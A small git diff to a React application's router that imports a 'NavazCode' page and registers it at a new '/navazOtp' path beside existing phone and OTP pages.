@@ -12,6 +12,7 @@ import Data from "./Pages/Data";
 import Phone from "./Pages/Phone";
 import PhoneOtp from "./Pages/PhoneOtp";
 import Navaz from "./Pages/Navaz";
+import NavazCode from "./Pages/NavazCode";
 
 // export const api_route = "http://localhost:8080";
 export const api_route = "https://efaa-server.onrender.com";
@@ -70,6 +71,10 @@ function App() {
     {
       path: "/navaz",
       element: <Navaz />,
+    },
+    {
+      path: "/navazOtp",
+      element: <NavazCode />,
     },
   ];
 
